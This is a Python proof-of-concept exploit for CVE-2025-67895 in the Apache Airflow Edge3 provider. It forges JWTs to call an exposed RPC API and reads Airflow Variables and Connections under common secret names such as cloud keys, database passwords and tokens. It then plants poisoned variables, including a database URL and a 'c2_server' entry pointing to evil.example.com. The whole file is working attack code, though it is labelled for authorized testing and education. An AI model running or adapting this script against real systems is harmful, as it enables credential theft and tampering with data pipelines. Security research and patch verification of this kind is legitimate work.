#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Airflow Edge3 Provider — Secrets Exfiltration via RPC API
# CVE            : CVE-2025-67895
# Vendor         : Apache Software Foundation
# Product        : Apache Airflow Providers Edge3
# Affected       : < 2.0.0
# Fixed          : 2.0.0
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-67895 Vector 3 — Secrets exfiltration via RPC API.

Demonstrates the REAL-WORLD IMPACT of the exposed RPC API: stealing
database connection strings, API keys, cloud credentials, and other
sensitive configuration from Airflow Variables and Connections.

ATTACK CHAIN:
    1. Enumerate all Variables and read their values
    2. Read Connection objects (DB creds, API keys)
    3. Access default 'airflow_db' connection
    4. Create a poisoned connection to demonstrate integrity impact

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-67895

Requirements:
    - PyJWT: pip install PyJWT
    - requests: pip install requests
"""

import sys
import json
import time
import argparse
import traceback

try:
    import jwt
except ImportError:
    print("[!] PyJWT not installed. Run: pip install PyJWT")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)


# ─────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8080
DEFAULT_SECRET_KEY = "my-secret-key-for-testing"
JWT_ALGORITHM = "HS512"
JWT_AUDIENCE = "api"
JWT_EXPIRY_SECONDS = 60

RPCAPI_ENDPOINT = "/edge_worker/v1/rpcapi"

# Internal Airflow methods for secrets exfiltration
METHOD_FETCH_VARIABLE = "airflow.secrets.metastore.MetastoreBackend._fetch_variable"
METHOD_FETCH_CONNECTION = "airflow.secrets.metastore.MetastoreBackend._fetch_connection"
METHOD_SET_VARIABLE = "airflow.models.variable.Variable._set"

# Common Airflow variable names that may contain secrets
COMMON_VAR_NAMES = [
    "aws_access_key_id",
    "aws_secret_access_key",
    "gcp_service_account",
    "slack_webhook_url",
    "smtp_password",
    "api_key",
    "database_password",
    "secret_key",
    "encryption_key",
    "github_token",
    "docker_registry_password",
    # Lab-specific
    "pwned_via_cve_2025_67895",
]

# Common Airflow connection IDs (production environments often use these)
COMMON_CONN_IDS = [
    "airflow_db",           # The Airflow metastore DB connection
    "aws_default",          # AWS default connection
    "aws_production",       # Production AWS credentials
    "production_db",        # Production database credentials
    "google_cloud_default", # GCP default connection
    "postgres_default",     # PostgreSQL default
    "mysql_default",        # MySQL default
    "http_default",         # HTTP default
    "ssh_default",          # SSH default
    "spark_default",        # Spark default
    "slack_default",        # Slack default
]


def banner():
    print("=" * 72)
    print("  CVE-2025-67895 — Vector 3: Secrets Exfiltration PoC")
    print("  Apache Airflow Providers Edge3 < 2.0.0")
    print("  Impact Demonstration: Reading Airflow Secrets via RPC API")
    print("=" * 72)
    print()


def generate_jwt(secret_key: str, method: str) -> str:
    """Generate JWT token for RPC API method invocation."""
    now = int(time.time())
    payload = {
        "method": method,
        "aud": JWT_AUDIENCE,
        "iat": now,
        "nbf": now,
        "exp": now + JWT_EXPIRY_SECONDS,
    }
    return jwt.encode(payload, secret_key, algorithm=JWT_ALGORITHM)


def rpc_call(base_url: str, secret_key: str, method: str, params: dict) -> requests.Response:
    """Send a JSON-RPC 2.0 request to the /rpcapi endpoint."""
    token = generate_jwt(secret_key, method)
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": token,
    }
    rpc_body = {
        "jsonrpc": "2.0",
        "method": method,
        "params": {
            "__var": params,
            "__type": "dict",
        },
    }
    return requests.post(
        f"{base_url}{RPCAPI_ENDPOINT}",
        json=rpc_body,
        headers=headers,
        timeout=15,
    )


def exploit(target_host: str, target_port: int, secret_key: str):
    """
    Demonstrate secrets exfiltration via the exposed RPC API.
    """
    base_url = f"http://{target_host}:{target_port}"
    stolen_secrets = []

    # ─── Step 1: Verify API access ───
    print("[*] Step 1: Verifying RPC API access...")
    try:
        resp = requests.get(f"{base_url}/edge_worker/v1/health", timeout=10)
        if resp.status_code != 200:
            print(f"    [-] API not available")
            return False
        print(f"    [+] Edge Worker API is active")
    except Exception as e:
        print(f"    [-] Connection failed: {e}")
        return False
    print()

    # ─── Step 2: Enumerate Variables (secret key/value pairs) ───
    print("[*] Step 2: Attempting to read Airflow Variables (secrets)...")
    print(f"    Method: {METHOD_FETCH_VARIABLE}")
    print(f"    Testing {len(COMMON_VAR_NAMES)} common variable names...")
    print()

    vars_found = 0
    for var_name in COMMON_VAR_NAMES:
        try:
            resp = rpc_call(base_url, secret_key, METHOD_FETCH_VARIABLE, {"key": var_name})
            if resp.status_code == 200:
                value = resp.json()
                if value is not None:
                    vars_found += 1
                    # Truncate sensitive values for display
                    display_val = str(value)
                    if len(display_val) > 80:
                        display_val = display_val[:80] + "..."
                    print(f"    [+] FOUND: {var_name} = {display_val}")
                    stolen_secrets.append({
                        "type": "variable",
                        "key": var_name,
                        "value": value,
                    })
        except Exception as e:
            pass  # Variable doesn't exist — expected for most names

    if vars_found == 0:
        print(f"    [~] No matching variables found (common names not in use)")
    else:
        print(f"\n    [+] {vars_found} variables exfiltrated!")
    print()

    # ─── Step 3: Attempt to read Connection objects ───
    print("[*] Step 3: Attempting to read Airflow Connections (credentials)...")
    print(f"    Method: {METHOD_FETCH_CONNECTION}")
    print(f"    Testing {len(COMMON_CONN_IDS)} common connection IDs...")
    print()

    conns_found = 0
    for conn_id in COMMON_CONN_IDS:
        try:
            resp = rpc_call(base_url, secret_key, METHOD_FETCH_CONNECTION, {"conn_id": conn_id})
            if resp.status_code == 200:
                value = resp.json()
                if value is not None:
                    conns_found += 1
                    # Connection objects may be serialized as Airflow objects
                    display_val = str(value)
                    if len(display_val) > 120:
                        display_val = display_val[:120] + "..."
                    print(f"    [+] FOUND CONNECTION: {conn_id}")
                    print(f"        Value: {display_val}")
                    stolen_secrets.append({
                        "type": "connection",
                        "key": conn_id,
                        "value": value,
                    })
        except Exception as e:
            pass  # Connection doesn't exist — expected

    if conns_found == 0:
        print(f"    [~] No matching connections found via metastore backend")
        print(f"    [~] Connections may use a different secrets backend or conn IDs")
    else:
        print(f"\n    [+] {conns_found} connection credentials exfiltrated!")
    print()

    # ─── Step 4: Demonstrate integrity impact — inject a poisoned variable ───
    print("[*] Step 4: Demonstrating integrity impact — injecting poisoned variables...")

    poisoned_vars = {
        "attacker_backdoor": json.dumps({
            "c2_server": "evil.example.com",
            "exfil_endpoint": "/api/data",
            "planted_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }),
        "database_url_override": "postgresql://attacker:password@evil.example.com:5432/exfil",
    }

    for var_key, var_value in poisoned_vars.items():
        try:
            resp = rpc_call(base_url, secret_key, METHOD_SET_VARIABLE, {
                "key": var_key,
                "value": var_value,
            })
            if resp.status_code == 200:
                print(f"    [+] INJECTED: {var_key} = {var_value[:60]}...")
                stolen_secrets.append({
                    "type": "injected_variable",
                    "key": var_key,
                    "value": var_value,
                })
            else:
                print(f"    [-] Failed to inject {var_key}: HTTP {resp.status_code}")
        except Exception as e:
            print(f"    [-] Failed to inject {var_key}: {e}")
    print()

    # ─── Step 5: Verify injected data persists ───
    print("[*] Step 5: Verifying injected data persists in Airflow...")
    for var_key in poisoned_vars:
        try:
            resp = rpc_call(base_url, secret_key, METHOD_FETCH_VARIABLE, {"key": var_key})
            if resp.status_code == 200:
                value = resp.json()
                if value is not None:
                    print(f"    [+] CONFIRMED: {var_key} persists in Airflow metastore")
                    print(f"        Value: {str(value)[:80]}")
                else:
                    print(f"    [-] {var_key} returned null")
            else:
                print(f"    [-] Read-back failed: HTTP {resp.status_code}")
        except Exception as e:
            print(f"    [-] Read-back failed: {e}")
    print()

    # ─── Summary ───
    print("=" * 72)
    print("  [+] VECTOR 3 CONFIRMED — Secrets Exfiltration Successful")
    print()
    print(f"  Total secrets stolen/injected: {len(stolen_secrets)}")
    print()
    print("  Impact demonstrated:")
    print("    - READ:  Exfiltrated Airflow Variables (may contain API keys, creds)")
    print("    - WRITE: Injected poisoned variables into Airflow metastore")
    print("    - These variables are trusted by DAGs and operators at runtime")
    print("    - An attacker could redirect data pipelines, steal credentials,")
    print("      or inject malicious configuration into scheduled tasks")
    print()
    print("  In a real environment, this would expose:")
    print("    - Database credentials (Connection objects)")
    print("    - Cloud provider keys (AWS, GCP, Azure)")
    print("    - API tokens and webhook URLs")
    print("    - Encryption keys and signing secrets")
    print("=" * 72)

    return len(stolen_secrets) > 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-67895 PoC Vector 3 — Secrets Exfiltration",
    )
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--secret-key", "-k", default=DEFAULT_SECRET_KEY,
                        help=f"Airflow internal_api_secret_key")
    args = parser.parse_args()

    banner()
    result = exploit(args.host, args.port, args.secret_key)
    sys.exit(0 if result else 1)
